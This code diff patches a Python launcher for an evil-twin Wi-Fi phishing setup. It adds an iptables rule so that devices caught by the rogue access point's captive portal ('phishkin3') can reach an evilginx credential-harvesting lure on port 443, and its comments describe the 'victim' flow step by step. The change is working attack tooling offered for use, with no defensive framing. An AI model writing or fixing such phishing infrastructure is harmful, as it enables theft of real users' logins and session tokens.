@@ -217,6 +217,24 @@ def start_in_tmux(interface):
         "tmux", "new-window", "-t", "phishkin3", "-n", "evilginx",
         "%s -c %s -p %s -developer" % (EVILGINX, EV_CONFIG_DIR, PHISHLETS_DIR)])
     say("started evilginx in tmux (window evilginx)")
+
+    # phishkin3 sets up its FORWARD chain -- allow DNS, allow traffic to the
+    # portal, DROP the rest -- so the victim cannot reach anything on the AP
+    # except the portal on port 8080. That includes the lure served by evilginx
+    # on 443, which is where /login redirects them and which the victim's browser
+    # then cannot reach: they see the captive-portal notification, tap "connect",
+    # and get nothing because their session is blocked before the TLS handshake.
+    #
+    # The gate has to let the lure's own domain through on 443 to the AP as well
+    # -- everywhere else stays blocked, so this does not open the internet up.
+    # INSERT so it lands before the DROP rule that phishkin3 appends.
+    time.sleep(4)  # let phishkin3 install its rules first
+    for cmd in [
+        "iptables -I FORWARD 1 -i %s -p tcp --dport 443 -d %s -j ACCEPT"
+            % (interface, AP_IP),
+    ]:
+        subprocess.run(["sh", "-c", cmd])
+    say("opened 443 to %s (evilginx) through the phishkin3 gate" % AP_IP)
     say("attach with: tmux attach -t phishkin3")
 
 
